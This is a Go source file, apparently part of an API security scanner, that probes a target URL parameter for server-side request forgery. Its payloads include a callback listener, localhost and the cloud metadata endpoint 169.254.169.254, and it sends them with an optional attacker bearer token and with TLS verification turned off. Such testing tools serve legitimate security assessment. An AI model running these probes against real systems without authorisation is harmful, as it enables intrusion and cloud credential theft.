package logic

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"time"

	"github.com/pterm/pterm"
)

type SSRFContext struct {
	TargetURL string
	ParamName string
	Callback  string // The "Canary" or "Interactsh" listener
}

func (s *SSRFContext) Probe() {
	pterm.DefaultHeader.WithFullWidth(false).Println("API7: Server-Side Request Forgery Tracker")

	client := &http.Client{
		Timeout: 10 * time.Second,
		// We do NOT follow redirects automatically to detect if the API 
		// is acting as a proxy or just a redirector.
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	payloads := []string{
		s.Callback,
		"http://127.0.0.1:80",
		"http://169.254.169.254/latest/meta-data/",
	}

	for _, payload := range payloads {
		if payload == "" { continue }

		u, _ := url.Parse(s.TargetURL)
		q := u.Query()
		q.Set(s.ParamName, payload)
		u.RawQuery = q.Encode()
		fuzzedURL := u.String()

		pterm.Info.Printf("Injecting SSRF Payload: %s\n", payload)

		req, _ := http.NewRequest("GET", fuzzedURL, nil)
		if CurrentSession.AttackerToken != "" {
			req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", CurrentSession.AttackerToken))
		}

		resp, err := client.Do(req)
		if err != nil {
			pterm.Error.Printf("Request failed for %s: %v\n", payload, err)
			continue
		}
		defer resp.Body.Close()

		// Logic analysis:
		// 1. If we hit metadata/localhost and get 200/403/401, the server reached it.
		// 2. If we hit the callback and see a hit on our listener, it's confirmed.
		if resp.StatusCode < 500 {
			if payload == "http://127.0.0.1:80" || payload == "http://169.254.169.254/latest/meta-data/" {
				pterm.Warning.Prefix = pterm.Prefix{Text: "VULN", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
				pterm.Warning.Printf("PROBABLE SSRF: Internal resource responded with status %d\n", resp.StatusCode)
			} else {
				pterm.Success.Printf("Payload delivered. Status: %d. Monitor your listener: %s\n", resp.StatusCode, s.Callback)
			}
		}
	}
}